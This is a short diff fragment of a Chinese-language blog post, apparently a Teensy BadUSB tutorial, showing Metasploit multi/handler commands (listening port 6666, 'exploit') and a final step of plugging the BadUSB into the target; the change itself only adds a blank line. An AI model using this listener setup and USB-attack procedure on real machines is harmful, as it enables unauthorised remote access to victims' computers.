@@ -78,6 +78,7 @@ msf exploit(multi/handler) > set lport 6666
 msf exploit(multi/handler) > exploit
 ```
 ![5](http://da1sy.github.io/assets/images/9-Yue/teensy-5.png)
+
 ### 8.最后对目标插入badusb
 效果图如下
 ![6](http://da1sy.github.io/assets/images/9-Yue/teensy-s1.gif)
